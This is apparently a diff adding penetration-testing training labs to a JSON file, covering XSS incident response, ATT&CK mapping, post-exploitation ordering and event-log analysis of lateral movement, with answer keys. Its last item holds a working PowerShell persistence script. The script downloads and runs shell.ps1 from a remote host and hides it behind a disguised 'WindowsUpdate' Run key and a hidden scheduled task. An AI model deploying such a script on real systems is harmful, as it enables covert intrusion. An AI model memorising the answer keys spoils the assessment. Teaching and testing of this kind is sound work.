+      {"time": "13:02", "event": "Application monitor detects script variant in comment records — critical alert raised 4 hours after injection"},
+      {"time": "13:05", "event": "Network monitor detects cookie exfiltration to attacker-controlled domain — session tokens being stolen at scale"}
+    ],
+    "actions": [
+      {
+        "id": "act1",
+        "description": "Block source IP 203.0.113.42 at the WAF and switch the XSS rule from detection mode to blocking mode",
+        "correct": true
+      },
+      {
+        "id": "act2",
+        "description": "Sanitize all stored comment records by stripping or HTML-encoding script tags and event handler attributes",
+        "correct": true
+      },
+      {
+        "id": "act3",
+        "description": "Invalidate and rotate session tokens for all users who viewed /blog/post/22 since 11:30",
+        "correct": true
+      },
+      {
+        "id": "act4",
+        "description": "Take the entire blog comments feature offline permanently until a full code audit is completed",
+        "correct": false
+      },
+      {
+        "id": "act5",
+        "description": "Apply pending OS security patches to the web server host",
+        "correct": false
+      },
+      {
+        "id": "act6",
+        "description": "Restart the database server to flush active connections and query caches",
+        "correct": false
+      }
+    ],
+    "answers": [
+      {
+        "id": "a1",
+        "text": "Stored XSS is higher severity than reflected XSS because the payload executes for every user who views the content, not just the one who clicks a crafted link — the attack surface scales with the number of viewers",
+        "correct": true
+      },
+      {
+        "id": "a2",
+        "text": "Output encoding (HTML entity encoding) at render time prevents injected script from executing even if input validation and the WAF were both bypassed — it is the most reliable XSS defence",
+        "correct": true
+      }
+    ],
+    "explanation": "**Why these three actions are correct**\n\n**Block IP + switch WAF to blocking mode** — The attacker IP is known from WAF logs. Blocking it prevents further payloads. More importantly, switching the XSS rule from detection to blocking mode closes the filter bypass that allowed the initial injection. Detection-only WAF rules are a common misconfiguration — they alert without stopping the attack.\n\n**Sanitize stored records** — The malicious payload is still in the database. Every new page load of /blog/post/22 continues to execute the script for any user who hasn't yet viewed it. Sanitizing the stored records (strip or HTML-encode the script content) stops ongoing exploitation without requiring the feature to be taken offline.\n\n**Rotate session tokens** — The exfiltration logs show session cookies being sent to the attacker's domain. Any session token exfiltrated before detection is now in the attacker's possession and remains valid until it expires or is invalidated. Rotating tokens for all affected users forces re-authentication and voids the stolen cookies.\n\n**Why the other actions are wrong**\n\nTaking comments offline permanently is disproportionate — sanitizing stored content and fixing the output encoding vulnerability addresses the root cause without a permanent feature removal. OS patching and database restarts address infrastructure concerns unrelated to this application-layer attack. They would have no effect on the XSS or the exfiltrated tokens."
+  },
+  {
+    "id": "comptia-mitre-attack-mapping",
+    "title": "Match Attack Techniques to MITRE ATT&CK Tactics",
+    "description": "Match eight penetration testing attack techniques to their correct MITRE ATT&CK tactic categories.",
+    "type": "drag-match",
+    "timeLimit": 360,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Attack Frameworks",
+    "technologies": ["MITRE ATT&CK", "VLAN Hopping", "Credential Dumping", "Container Escape", "Prompt Injection"],
+    "labCategory": "Implement",
+    "scenario": "MITRE ATT&CK provides a standardised taxonomy of adversary tactics, techniques, and procedures. Modern pentest reports increasingly reference ATT&CK technique IDs to contextualise findings.\n\nMatch each attack technique on the left to its primary MITRE ATT&CK tactic category on the right.",
+    "pairs": [
+      {
+        "id": "p1",
+        "term": "VLAN hopping via double-tagging 802.1Q frames",
+        "definition": "Initial Access — Network Segmentation Bypass"
+      },
+      {
+        "id": "p2",
+        "term": "Pass-the-hash using CrackMapExec with NTLM hash",
+        "definition": "Lateral Movement (T1550.002 — Use Alternate Authentication Material)"
+      },
+      {
+        "id": "p3",
+        "term": "Mimikatz sekurlsa::logonpasswords against LSASS",
+        "definition": "Credential Access — OS Credential Dumping (T1003)"
+      },
+      {
+        "id": "p4",
+        "term": "Process injection via VirtualAllocEx and CreateRemoteThread",
+        "definition": "Defense Evasion / Privilege Escalation (T1055 — Process Injection)"
+      },
+      {
+        "id": "p5",
+        "term": "Container escape exploiting the Docker privileged flag",
+        "definition": "Privilege Escalation — Escape to Host (T1611)"
+      },
+      {
+        "id": "p6",
+        "term": "SSRF to EC2 instance metadata service to steal IAM credentials",
+        "definition": "Credential Access — Unsecured Credentials: Cloud Instance Metadata API (T1552.005)"
+      },
+      {
+        "id": "p7",
+        "term": "Prompt injection to exfiltrate data from an LLM-integrated application",
+        "definition": "Initial Access / Exfiltration — Prompt Injection (Emerging Technique)"
+      },
+      {
+        "id": "p8",
+        "term": "Creating a scheduled task to execute a reverse shell on system startup",
+        "definition": "Persistence — Scheduled Task/Job (T1053.005)"
+      }
+    ],
+    "explanation": "**VLAN Hopping → Initial Access**\n\nDouble-tagging exploits trunk ports that accept untagged frames by nesting two 802.1Q headers. The outer tag is stripped by the access switch, and the inner tag routes the packet to the target VLAN. This bypasses VLAN-based network segmentation without requiring credentials — it is an initial access or network bypass technique.\n\n**Pass-the-Hash → Lateral Movement**\n\nPtH authenticates to remote services using a stolen NTLM hash rather than a plaintext password. Its purpose is to move laterally from a compromised workstation to other hosts using the same credentials — ATT&CK T1550.002. It does not gain initial access or new credentials; it reuses existing ones across the network.\n\n**Mimikatz → Credential Access**\n\nDumping credentials from LSASS is classified under ATT&CK T1003 (OS Credential Dumping). The goal is to obtain authentication material (plaintext passwords, NTLM hashes, Kerberos tickets) for use in subsequent lateral movement or privilege escalation steps.\n\n**Process Injection → Defense Evasion / Privilege Escalation**\n\nT1055 covers techniques where code is injected into the address space of another process. This can evade security products that allowlist certain processes, and can escalate privileges if the target process runs at a higher integrity level.\n\n**Container Escape → Privilege Escalation**\n\nT1611 covers breaking out of container isolation to access the underlying host OS. A container started with `--privileged` has access to all host devices and capabilities — a trivial escape path that constitutes privilege escalation from container user to host root.\n\n**EC2 Metadata SSRF → Credential Access**\n\nT1552.005 describes obtaining credentials via the cloud instance metadata API. SSRF is the delivery mechanism, but the ATT&CK classification focuses on the outcome: cloud IAM credential theft.\n\n**Prompt Injection → Initial Access / Exfiltration**\n\nPrompt injection is an emerging technique targeting LLM-integrated applications. Malicious instructions embedded in user input or external data manipulate the model's behaviour — potentially bypassing access controls, exfiltrating data, or executing unintended actions. Modern security assessments increasingly include AI-integrated applications in scope as prompt injection becomes a recognized attack vector.\n\n**Scheduled Task → Persistence**\n\nT1053.005 covers Windows scheduled tasks created for persistence. The task executes attacker-controlled code on a recurring trigger (logon, startup, interval), maintaining access even after reboots or credential rotations."
+  },
+  {
+    "id": "comptia-post-exploitation-ordering",
+    "title": "Order the Post-Exploitation Phases",
+    "description": "Arrange eight post-exploitation activities in the correct sequence from foothold stabilisation through artefact cleanup.",
+    "type": "ordering",
+    "timeLimit": 360,
+    "difficulty": "intermediate",
+    "platform": "CompTIA",
+    "category": "Post-Exploitation",
+    "technologies": ["Post-Exploitation", "Persistence", "Lateral Movement", "Artifact Cleanup"],
+    "labCategory": "Implement",
+    "scenario": "You have just achieved remote code execution on an internal workstation after exploiting a service vulnerability. Your objective is to demonstrate the complete post-exploitation attack chain against the target domain without triggering incident response.\n\nArrange the following eight activities in the correct operational order.",
+    "steps": [
+      { "id": "s1", "text": "Establish a stable initial foothold — upgrade to a persistent shell and confirm session reliability", "correctPosition": 1 },
+      { "id": "s2", "text": "Escalate privileges on the local host — exploit a local vulnerability or misconfiguration to gain SYSTEM or root access", "correctPosition": 2 },
+      { "id": "s3", "text": "Perform internal network enumeration — map live hosts, open services, and domain structure from the compromised host", "correctPosition": 3 },
+      { "id": "s4", "text": "Establish a persistence mechanism — install a scheduled task or registry Run key to survive reboots", "correctPosition": 4 },
+      { "id": "s5", "text": "Conduct lateral movement — authenticate to high-value targets using harvested credentials or hashes", "correctPosition": 5 },
+      { "id": "s6", "text": "Simulate data exfiltration — stage and transfer a representative data sample to demonstrate impact", "correctPosition": 6 },
+      { "id": "s7", "text": "Remove all persistence artefacts — delete scheduled tasks, registry keys, payload files, and staging directories", "correctPosition": 7 },
+      { "id": "s8", "text": "Document the complete attack chain with timestamps, techniques, and evidence for the penetration test report", "correctPosition": 8 }
+    ],
+    "explanation": "**Step 1 — Foothold stabilisation**\n\nA raw exploit shell is unreliable. Upgrade to a stable session (Meterpreter, reverse HTTPS beacon, or PTY shell) before any further action. Losing the connection mid-engagement wastes time and may leave partial artefacts.\n\n**Step 2 — Local privilege escalation**\n\nElevated privileges are required for credential harvesting and stealthy persistence. Achieve SYSTEM or root before broad internal discovery — this minimises subsequent permission errors and avoids noisy re-exploitation attempts.\n\n**Step 3 — Internal enumeration**\n\nWith a privileged session, map the internal environment: ARP tables, domain controller names, trust relationships, live hosts, and service banners. This reconnaissance shapes every subsequent move and avoids blind lateral movement.\n\n**Step 4 — Persistence**\n\nPersistence is established before lateral movement so that if a lateral session is detected and killed, access to the foothold host is retained. Common mechanisms include registry Run keys, scheduled tasks, WMI event subscriptions, and service installs.\n\n**Step 5 — Lateral movement**\n\nUsing harvested credentials or NTLM hashes, authenticate to high-value targets such as domain controllers, file servers, and build systems. Pass-the-hash, PsExec, WMI remote execution, and SMB relay are common techniques.\n\n**Step 6 — Exfiltration simulation**\n\nStage and transfer a controlled data sample to demonstrate impact. In professional engagements this is scoped to confirming capability only — actual sensitive client data is never removed from the environment.\n\n**Step 7 — Artefact cleanup**\n\nCleanup is a contractual and ethical obligation. Remove every persistence mechanism, payload file, staging directory, and relevant log entry created during the engagement. Incomplete removal can leave systems in an insecure state or constitute unauthorised access after the testing window closes.\n\n**Step 8 — Documentation**\n\nEvery action must be recorded with timestamps, tool commands, and evidence screenshots. This becomes the attack narrative section of the penetration test report and is required for clients to validate remediation."
+  },
+  {
+    "id": "comptia-lateral-movement-logs",
+    "title": "Detect Lateral Movement in Windows Event Logs",
+    "description": "Analyse Windows Security and System event log entries to identify lateral movement indicators, determine which hosts were targeted, and distinguish attacker activity from normal user logons.",
+    "type": "log-analysis",
+    "timeLimit": 600,
+    "difficulty": "advanced",
+    "platform": "CompTIA",
+    "category": "Lateral Movement",
+    "technologies": ["Windows Event Logs", "PsExec", "Event ID 4624", "Lateral Movement", "SIEM"],
+    "labCategory": "Troubleshoot",
+    "scenario": "Your SIEM has forwarded Windows Security and System event log entries collected from seven domain hosts over a six-hour window. A security alert has flagged unusual authentication patterns in the 14:27–14:33 time range.\n\nAnalyse the log entries and select all correct statements below.",
+    "logs": [
+      { "timestamp": "2024-11-14 08:47:22", "level": "INFO", "source": "WS03-Security", "message": "Event ID 4624 — Successful logon. Account: alice@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 09:02:14", "level": "INFO", "source": "WS04-Security", "message": "Event ID 4624 — Successful logon. Account: bob@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 09:30:11", "level": "INFO", "source": "WS07-Security", "message": "Event ID 4624 — Successful logon. Account: charlie@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 10:15:33", "level": "INFO", "source": "WS01-Security", "message": "Event ID 4624 — Successful logon. Account: carol@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 11:45:22", "level": "INFO", "source": "WS05-Security", "message": "Event ID 4624 — Successful logon. Account: dave@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 12:31:00", "level": "INFO", "source": "WS02-Security", "message": "Event ID 4624 — Successful logon. Account: eve@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 13:00:05", "level": "INFO", "source": "WS06-Security", "message": "Event ID 4624 — Successful logon. Account: frank@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 14:27:58", "level": "WARN", "source": "WS01-Security", "message": "Event ID 4624 — Successful logon. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Auth: NTLM" },
+      { "timestamp": "2024-11-14 14:28:11", "level": "WARN", "source": "WS02-Security", "message": "Event ID 4624 — Successful logon. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Auth: NTLM" },
+      { "timestamp": "2024-11-14 14:28:33", "level": "ERROR", "source": "FS01-Security", "message": "Event ID 4625 — Logon failure. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Reason: Unknown username or bad password" },
+      { "timestamp": "2024-11-14 14:28:34", "level": "ERROR", "source": "FS01-Security", "message": "Event ID 4625 — Logon failure. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Reason: Unknown username or bad password" },
+      { "timestamp": "2024-11-14 14:28:35", "level": "ERROR", "source": "FS01-Security", "message": "Event ID 4625 — Logon failure. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Reason: Unknown username or bad password" },
+      { "timestamp": "2024-11-14 14:29:02", "level": "WARN", "source": "FS01-Security", "message": "Event ID 4624 — Successful logon. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Auth: NTLM" },
+      { "timestamp": "2024-11-14 14:29:44", "level": "WARN", "source": "SRV01-Security", "message": "Event ID 4624 — Successful logon. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Auth: NTLM" },
+      { "timestamp": "2024-11-14 14:30:07", "level": "WARN", "source": "DC01-Security", "message": "Event ID 4624 — Successful logon. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Auth: NTLM" },
+      { "timestamp": "2024-11-14 14:30:09", "level": "WARN", "source": "DC01-System", "message": "Event ID 7045 — New service installed. Service Name: PSEXESVC | Type: User Mode Service | Start: Demand Start | Account: LocalSystem" },
+      { "timestamp": "2024-11-14 14:30:15", "level": "INFO", "source": "WS03-Security", "message": "Event ID 4624 — Successful logon. Account: george@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 14:31:15", "level": "WARN", "source": "DC01-Security", "message": "Event ID 4624 — Successful logon. Account: ADMINISTRATOR | Logon Type: 3 (Network) | Source IP: 192.168.1.50 | Auth: Kerberos" },
+      { "timestamp": "2024-11-14 14:31:55", "level": "WARN", "source": "DC01-Security", "message": "Event ID 4648 — Logon with explicit credentials. Subject: ADMINISTRATOR | Target: DA-svc@corp.local | Server: DC01 | Source IP: 192.168.1.50" },
+      { "timestamp": "2024-11-14 14:32:10", "level": "WARN", "source": "DC01-Security", "message": "Event ID 4672 — Special privileges assigned to new logon. Account: ADMINISTRATOR | Privileges: SeDebugPrivilege, SeImpersonatePrivilege, SeTcbPrivilege" },
+      { "timestamp": "2024-11-14 15:00:00", "level": "INFO", "source": "WS01-Security", "message": "Event ID 4624 — Successful logon. Account: carol@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 15:15:22", "level": "INFO", "source": "WS04-Security", "message": "Event ID 4624 — Successful logon. Account: bob@corp.local | Logon Type: 2 (Interactive) | Source IP: —" },
+      { "timestamp": "2024-11-14 16:45:00", "level": "INFO", "source": "WS02-Security", "message": "Event ID 4624 — Successful logon. Account: eve@corp.local | Logon Type: 2 (Interactive) | Source IP: —" }
+    ],
+    "answers": [
+      { "id": "a1", "text": "Event ID 4624 Logon Type 3 (Network Logon) from a single source IP across multiple hosts within 60 seconds, combined with Event ID 7045 (PSEXESVC service install) on DC01, is the definitive lateral movement indicator in this log set", "correct": true },
+      { "id": "a2", "text": "DC01 was targeted with PsExec-based lateral movement, confirmed by the Event ID 7045 PSEXESVC service installation at 14:30:09", "correct": true },
+      { "id": "a3", "text": "Five distinct hosts were accessed by source IP 192.168.1.50: WS01, WS02, FS01, SRV01, and DC01", "correct": true },
+      { "id": "a4", "text": "Interactive logons (Event ID 4624 Logon Type 2) on workstations during business hours are normal user activity and are not part of the attacker lateral movement chain", "correct": true },
+      { "id": "a5", "text": "Event ID 4625 failed logons on FS01 are the primary indicator of the lateral movement technique used by the attacker", "correct": false },
+      { "id": "a6", "text": "Only three hosts were accessed — the FS01 and SRV01 Type 3 logon events originate from scheduled backup jobs, not the attacker", "correct": false },
+      { "id": "a7", "text": "Event ID 7045 on DC01 is a routine Windows Defender component installation and is unrelated to the authentication anomalies", "correct": false },
+      { "id": "a8", "text": "Event ID 4672 (Special Privileges Assigned) on DC01 is the strongest standalone indicator of the lateral movement technique used", "correct": false }
+    ],
+    "explanation": "**Event ID 4624 Type 3 — Network Logon**\n\nLogon Type 3 is a network authentication — the account authenticated to a remote host over the network rather than logging in at a local keyboard or RDP session. A single source IP successfully authenticating to five distinct hosts within 132 seconds (14:27:58–14:29:44) is a high-confidence lateral movement indicator regardless of which credentials were used.\n\n**Event ID 7045 — New Service Installed**\n\nPsExec achieves remote code execution by copying its service binary to the target and installing a temporary service (PSEXESVC). Event ID 7045 appearing on a domain controller immediately after a Type 3 logon from the attacker IP is a reliable PsExec signature. Threat hunters specifically correlate the sequence: 4624 Type 3 → 7045 PSEXESVC to identify this technique.\n\n**Event ID 4625 — Failed Logon**\n\nThree rapid failed logons on FS01 followed by a successful Type 3 logon indicate the attacker tested an incorrect credential first. The 4625 burst is a useful indicator of credential trial-and-error, but the lateral movement technique is still network logon (4624 Type 3). Failed logons alone do not identify the movement method.\n\n**Event ID 4672 — Special Privileges**\n\n4672 records privilege assignments at logon time and is a useful enrichment signal — it confirms the attacker obtained a high-privilege session on DC01. However, it is not a lateral movement indicator; it appears for any privileged logon, including legitimate administrator sessions. Its value is in confirming the severity of access, not the technique.\n\n**Distinguishing noise**\n\nEvent ID 4624 Type 2 (Interactive) logons show a local keyboard-present session or RDP with NLA. These have no Source IP (shown as —) and occur spread across different workstations during normal business hours. They are definitively noise in this investigation. The business-hours pattern, multiple different usernames, and Type 2 classification all distinguish them cleanly from the attacker's Type 3 events.\n\n**Why this matters**\n\nCorrelating 4624 Type 3 events across multiple hosts from the same source IP within a short time window is a fundamental lateral movement detection pattern used in every major SIEM ruleset. Combining it with 7045 on critical assets like domain controllers reduces false positives and provides the strongest evidence for an incident report."
+  },
+  {
+    "id": "comptia-powershell-persistence-fix",
+    "title": "Fix a PowerShell Post-Exploitation Persistence Script",
+    "description": "A PowerShell script that establishes registry Run key persistence and a scheduled task backup contains three bugs preventing it from working correctly. Find and fix all three.",
+    "type": "code-fix",
+    "timeLimit": 600,
+    "difficulty": "advanced",
+    "platform": "CompTIA",
+    "category": "Persistence",
+    "technologies": ["PowerShell", "Registry Persistence", "HKCU Run Key", "Post-Exploitation", "Artifact Cleanup"],
+    "labCategory": "Implement",
+    "scenario": "During a post-exploitation phase you deploy a PowerShell persistence script that writes a registry Run key entry and registers a scheduled task as a fallback, then removes both artefacts when called with the -Cleanup switch.\n\nThe script has three bugs:\n1. The registry path contains a typo that points to a non-existent key.\n2. The Run key value is passed as the wrong PowerShell type.\n3. The cleanup section hangs waiting for interactive confirmation.\n\nFix all three bugs so the script establishes persistence correctly and cleans up without prompting.",
+    "language": "powershell",
+    "brokenCode": "# Establishes registry Run key persistence and a scheduled task backup, then cleans up on demand\nparam(\n    [switch]$Cleanup\n)\n\n$RegPath  = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Curent'\n$RegName  = 'WindowsUpdate'\n$PayloadPath = 'C:\\ProgramData\\svchost.ps1'\n$TaskName = 'WindowsUpdateHelper'\n\n# Write payload to disk\n$Payload = 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.1.50/shell.ps1\")'\nSet-Content -Path $PayloadPath -Value $Payload -Force\n\n# Establish registry Run key persistence\nif (-not (Test-Path $RegPath)) {\n    New-Item -Path $RegPath -Force | Out-Null\n}\nNew-ItemProperty -Path $RegPath -Name $RegName -Value { powershell.exe -WindowStyle Hidden -File $PayloadPath } -PropertyType String -Force\n\n# Create scheduled task as a backup persistence mechanism\n$Action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-WindowStyle Hidden -File ' + $PayloadPath)\n$Trigger  = New-ScheduledTaskTrigger -AtStartup\n$Settings = New-ScheduledTaskSettingsSet -Hidden\nRegister-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force\n\nif ($Cleanup) {\n    # Remove registry Run key value\n    Remove-ItemProperty -Path $RegPath -Name $RegName -ErrorAction SilentlyContinue\n    # Delete payload file\n    Remove-Item -Path $PayloadPath -Force -ErrorAction SilentlyContinue\n    # Remove scheduled task -- will hang without -Confirm:$false\n    Unregister-ScheduledTask -TaskName $TaskName\n}",
+    "correctCode": "# Establishes registry Run key persistence and a scheduled task backup, then cleans up on demand\nparam(\n    [switch]$Cleanup\n)\n\n$RegPath  = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n$RegName  = 'WindowsUpdate'\n$PayloadPath = 'C:\\ProgramData\\svchost.ps1'\n$TaskName = 'WindowsUpdateHelper'\n\n# Write payload to disk\n$Payload = 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.1.50/shell.ps1\")'\nSet-Content -Path $PayloadPath -Value $Payload -Force\n\n# Establish registry Run key persistence\nif (-not (Test-Path $RegPath)) {\n    New-Item -Path $RegPath -Force | Out-Null\n}\nNew-ItemProperty -Path $RegPath -Name $RegName -Value 'powershell.exe -WindowStyle Hidden -File C:\\ProgramData\\svchost.ps1' -PropertyType String -Force\n\n# Create scheduled task as a backup persistence mechanism\n$Action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-WindowStyle Hidden -File ' + $PayloadPath)\n$Trigger  = New-ScheduledTaskTrigger -AtStartup\n$Settings = New-ScheduledTaskSettingsSet -Hidden\nRegister-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Force\n\nif ($Cleanup) {\n    # Remove registry Run key value\n    Remove-ItemProperty -Path $RegPath -Name $RegName -ErrorAction SilentlyContinue\n    # Delete payload file\n    Remove-Item -Path $PayloadPath -Force -ErrorAction SilentlyContinue\n    # Remove scheduled task without interactive confirmation prompt\n    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false\n}",
+    "validations": [
+      { "field": "Registry key path", "expected": "CurrentVersion\\Run — not CurrentVersion\\Curent" },
+      { "field": "New-ItemProperty value type", "expected": "String literal — curly-brace script block removed" },
+      { "field": "Unregister-ScheduledTask flag", "expected": "-Confirm:$false" }
+    ],
+    "explanation": "**Bug 1 — Registry path typo: `Curent` → `Run`**\n\nThe correct Run key path is `HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`. Writing to `Curent` creates a non-existent registry path that does nothing at startup. This is a high-consequence silent failure — the persistence mechanism appears to succeed (no error is thrown if `New-Item` creates the path) but Windows never executes the value at logon. Always verify the exact key name against a reference; `CurrentVersion\\Run` is the well-known startup mechanism for the current user context.\n\n**Bug 2 — Script block passed as a String value**\n\n`New-ItemProperty` with `-PropertyType String` requires a plain string value. Passing a script block (`{ powershell.exe -WindowStyle Hidden -File $PayloadPath }`) causes PowerShell to serialise the block's `ToString()` representation into the registry — which evaluates `$PayloadPath` as the type name `System.String` rather than the variable's value, producing a useless string. The correct value is a string literal containing the full command: `'powershell.exe -WindowStyle Hidden -File C:\\ProgramData\\svchost.ps1'`. The Windows Run key executor reads the value as a plain command string with no scripting capability.\n\n**Bug 3 — `Unregister-ScheduledTask` missing `-Confirm:$false`**\n\nBy default, `Unregister-ScheduledTask` prompts `Are you sure you want to perform this action?` and waits for keyboard input. In any non-interactive shell — reverse shell, service context, WMI remote execution, or automated script — this prompt blocks indefinitely until the session times out. Adding `-Confirm:$false` suppresses the confirmation and allows cleanup to complete silently.\n\n**Why cleanup matters**\n\nRemoving all persistence artefacts at engagement end is a contractual and legal obligation. Mechanisms left active after the agreed testing window closes can constitute ongoing unauthorised access under computer misuse legislation, regardless of intent. Cleanup scripts must be reliable — bugs like Bug 3 turn a contractual obligation into a liability."
+  }
+]
